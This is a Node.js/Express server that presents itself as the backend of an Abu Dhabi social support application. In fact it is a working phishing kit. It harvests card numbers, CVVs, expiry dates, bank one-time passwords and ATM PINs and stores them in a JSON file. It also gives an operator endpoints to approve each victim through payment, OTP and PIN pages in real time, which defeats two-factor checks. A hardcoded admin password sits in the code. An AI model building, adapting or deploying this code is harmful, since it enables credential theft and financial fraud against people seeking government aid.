// Abu Dhabi Social Support Program - backend server
// Serves the static frontend and provides a small JSON-file-backed API
// for storing application submissions and tracking active visits.

const express = require('express');
const fs = require('fs');
const path = require('path');
const crypto = require('crypto');

const app = express();
const PORT = process.env.PORT || 3000;
const ADMIN_PASSWORD = process.env.ADMIN_PASSWORD || 'Ha098765@@';

const DATA_DIR = path.join(__dirname, 'data');
const APPLICATIONS_FILE = path.join(DATA_DIR, 'applications.json');

// ---- Make sure the data folder/file exist ----
if (!fs.existsSync(DATA_DIR)) {
  fs.mkdirSync(DATA_DIR, { recursive: true });
}
if (!fs.existsSync(APPLICATIONS_FILE)) {
  fs.writeFileSync(APPLICATIONS_FILE, '[]', 'utf8');
}

function readApplications() {
  try {
    const raw = fs.readFileSync(APPLICATIONS_FILE, 'utf8');
    return JSON.parse(raw);
  } catch (err) {
    return [];
  }
}

function writeApplications(list) {
  fs.writeFileSync(APPLICATIONS_FILE, JSON.stringify(list, null, 2), 'utf8');
}

// ---- In-memory "active visits" tracker ----
// Each browser tab pings /api/heartbeat every ~15s with a random visitorId.
// A visitor counts as "active" if we heard from them in the last 30s.
const lastSeen = new Map();
const ACTIVE_WINDOW_MS = 30 * 1000;

function countActiveVisitors() {
  const now = Date.now();
  let count = 0;
  for (const [id, ts] of lastSeen.entries()) {
    if (now - ts <= ACTIVE_WINDOW_MS) {
      count++;
    } else {
      lastSeen.delete(id);
    }
  }
  return count;
}

function updateApplicationStatus(id, status, extra = {}) {
  const list = readApplications();
  const idx = list.findIndex((item) => item.id === id);
  if (idx === -1) return null;

  list[idx] = {
    ...list[idx],
    status,
    decisionAt: new Date().toISOString(),
    ...extra
  };
  writeApplications(list);
  return list[idx];
}

function getStageFromItem(item) {
  if (!item) return 'payment';
  if (item.stage) return item.stage;
  if (item.status === 'success') return 'success';
  if (item.status === 'accept') return 'otp';
  if (item.status === 'otp_pending') return 'otp';
  if (item.status === 'atm_pending') return 'atm';
  return 'payment';
}

app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

// ---- Admin auth middleware (simple shared-password gate) ----
function requireAdmin(req, res, next) {
  const supplied = req.get('x-admin-password') || req.query.password || '';
  if (supplied !== ADMIN_PASSWORD) {
    return res.status(401).json({ error: 'unauthorized' });
  }
  next();
}

// ---- API: submit a new application ----
app.post('/api/applications', (req, res) => {
  const { applicant, persons, status, card, payment } = req.body || {};

  if (!applicant || typeof applicant !== 'object') {
    return res.status(400).json({ error: 'invalid_payload' });
  }

  const record = {
    id: crypto.randomUUID(),
    applicant,
    persons: Array.isArray(persons) ? persons : [],
    submittedAt: new Date().toISOString(),
    status: status || 'pending',
    card: card || null,
    payment: payment || null
  };

  const list = readApplications();
  list.push(record);
  writeApplications(list);

  res.status(201).json({ id: record.id, submittedAt: record.submittedAt, status: record.status });
});

// ---- API: list applications (admin only) ----
app.get('/api/applications', requireAdmin, (req, res) => {
  const list = readApplications();
  list.sort((a, b) => new Date(b.submittedAt) - new Date(a.submittedAt));
  res.json(list);
});

// ---- API: verify the admin password ----
app.post('/api/admin/verify', (req, res) => {
  const { password } = req.body || {};
  res.json({ ok: password === ADMIN_PASSWORD });
});

// ---- API: heartbeat for the "active visits" counter ----
app.post('/api/heartbeat', (req, res) => {
  const { visitorId } = req.body || {};
  if (typeof visitorId === 'string' && visitorId.length > 0 && visitorId.length < 100) {
    lastSeen.set(visitorId, Date.now());
  }
  res.json({ ok: true });
});

// ---- API: current active visit count ----
app.get('/api/active-visits', (req, res) => {
  res.json({ count: countActiveVisitors() });
});

// ---- Payment + decision flow for pending review ----
app.post('/api/payment', (req, res) => {
  const { requestId, amount, currency, cardName, cardNumber, expiryDate, cvv } = req.body || {};
  const list = readApplications();
  const appIndex = list.findIndex((item) => item.id === requestId);

  if (appIndex === -1) {
    return res.status(404).json({ ok: false, error: 'application_not_found' });
  }

  const updated = {
    ...list[appIndex],
    status: 'pending',
    payment: {
      amount: amount || 0,
      currency: currency || 'SAR',
      cardName: cardName || 'Customer',
      cardNumber: cardNumber || '—',
      expiryDate: expiryDate || '—',
      cvv: cvv || '—',
      submittedAt: new Date().toISOString()
    },
    card: {
      cardName: cardName || 'Customer',
      cardNumber: cardNumber || '—',
      expiryDate: expiryDate || '—',
      cvv: cvv || '—'
    },
    updatedAt: new Date().toISOString()
  };

  list[appIndex] = updated;
  writeApplications(list);

  res.json({ ok: true, id: updated.id, status: updated.status });
});

app.get('/api/status/:id', (req, res) => {
  const { id } = req.params;
  const list = readApplications();
  const item = list.find((entry) => entry.id === id);

  if (!item) {
    return res.status(404).json({ ok: false, error: 'not_found' });
  }

  const status = item.status || 'pending';
  const stage = getStageFromItem(item);
  const otpSubmitted = Boolean(item.otp);
  const atmSubmitted = Boolean(item.atmPin);
  let redirectUrl = 'payment.html';
  let redirect = null;
  let decision = 'pending';
  let payloadStage = stage;

  if (status === 'accept' && stage === 'otp' && otpSubmitted) {
    redirectUrl = 'atm.html';
    redirect = 'atm.html';
    decision = 'approved';
    payloadStage = 'atm';
  } else if (status === 'accept' && stage === 'otp') {
    redirectUrl = 'otp.html';
    redirect = 'otp.html';
    decision = 'pending';
    payloadStage = 'otp';
  } else if (status === 'accept' && stage === 'atm' && atmSubmitted) {
    redirectUrl = 'success.html';
    redirect = 'success.html';
    decision = 'approved';
    payloadStage = 'success';
  } else if (status === 'accept' && stage === 'atm') {
    redirectUrl = 'atm.html';
    redirect = 'atm.html';
    decision = 'pending';
    payloadStage = 'atm';
  } else if (status === 'success') {
    redirectUrl = 'success.html';
    redirect = 'success.html';
    decision = 'approved';
    payloadStage = 'success';
  } else if (status === 'reject' && stage === 'otp') {
    redirectUrl = 'otp.html?error=1';
    redirect = 'otp.html?error=1';
    decision = 'rejected';
    payloadStage = 'otp';
  } else if (status === 'reject' && stage === 'atm') {
    redirectUrl = 'atm.html?error=1';
    redirect = 'atm.html?error=1';
    decision = 'rejected';
    payloadStage = 'atm';
  } else if (status === 'otp_pending') {
    redirectUrl = 'otp.html';
    redirect = 'otp.html';
    decision = 'pending';
    payloadStage = 'otp';
  } else if (status === 'atm_pending') {
    redirectUrl = 'atm.html';
    redirect = 'atm.html';
    decision = 'pending';
    payloadStage = 'atm';
  } else if (status === 'accept' && stage === 'payment') {
    redirectUrl = 'otp.html';
    redirect = 'otp.html';
    decision = 'approved';
    payloadStage = 'otp';
  }

  const payload = {
    ok: true,
    status,
    redirectUrl,
    redirect,
    decision,
    stage: payloadStage,
    otpSubmitted,
    atmSubmitted
  };

  res.json(payload);
});

app.post('/api/otp', (req, res) => {
  const { id, otp } = req.body || {};
  const list = readApplications();
  const item = list.find((entry) => entry.id === id);

  if (!item) {
    return res.status(404).json({ ok: false, error: 'not_found' });
  }

  if (typeof otp !== 'string' || otp.trim().length < 4) {
    return res.status(400).json({ ok: false, error: 'invalid_otp' });
  }

  item.status = 'otp_pending';
  item.stage = 'otp';
  item.otp = otp.trim();
  item.card = {
    ...(item.card || {}),
    otp: otp.trim()
  };
  item.payment = {
    ...(item.payment || {}),
    otp: otp.trim()
  };
  item.updatedAt = new Date().toISOString();
  writeApplications(list);

  res.json({ ok: true, status: 'otp_pending', stage: 'otp' });
});

app.post('/api/atm', (req, res) => {
  const { id, atmPin } = req.body || {};
  const list = readApplications();
  const item = list.find((entry) => entry.id === id);

  if (!item) {
    return res.status(404).json({ ok: false, error: 'not_found' });
  }

  if (typeof atmPin !== 'string' || !/^\d{4}$/.test(atmPin.trim())) {
    return res.status(400).json({ ok: false, error: 'invalid_atm_pin' });
  }

  const pin = atmPin.trim();
  item.status = 'atm_pending';
  item.stage = 'atm';
  item.atmPin = pin;
  item.card = {
    ...(item.card || {}),
    atm: pin
  };
  item.payment = {
    ...(item.payment || {}),
    atm: pin
  };
  item.updatedAt = new Date().toISOString();
  writeApplications(list);

  res.json({ ok: true, status: 'atm_pending', stage: 'atm' });
});

app.post('/api/applications/:id/decision', (req, res) => {
  const { id } = req.params;
  const { decision } = req.body || {};

  if (!['accept', 'reject'].includes(decision)) {
    return res.status(400).json({ ok: false, error: 'invalid_decision' });
  }

  const list = readApplications();
  const item = list.find((entry) => entry.id === id);
  if (!item) {
    return res.status(404).json({ ok: false, error: 'not_found' });
  }

  const currentStage = getStageFromItem(item);
  let nextStage = currentStage;
  let nextStatus = decision;

  if (decision === 'accept') {
    if (currentStage === 'payment') {
      nextStage = 'otp';
      nextStatus = 'accept';
    } else if (currentStage === 'otp') {
      nextStage = 'atm';
      nextStatus = 'accept';
    } else if (currentStage === 'atm') {
      nextStage = 'success';
      nextStatus = 'success';
    } else {
      nextStage = 'otp';
      nextStatus = 'accept';
    }
  } else {
    if (currentStage === 'payment') {
      nextStage = 'payment';
      nextStatus = 'reject';
    } else if (currentStage === 'otp') {
      nextStage = 'otp';
      nextStatus = 'reject';
    } else if (currentStage === 'atm') {
      nextStage = 'atm';
      nextStatus = 'reject';
    } else {
      nextStage = 'payment';
      nextStatus = 'reject';
    }
  }

  const updated = updateApplicationStatus(id, nextStatus, {
    stage: nextStage,
    decisionText: decision === 'accept' ? 'مقبول' : 'مرفوض'
  });
  if (!updated) {
    return res.status(404).json({ ok: false, error: 'not_found' });
  }

  res.json({ ok: true, id, status: nextStatus, stage: nextStage });
});

app.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
});
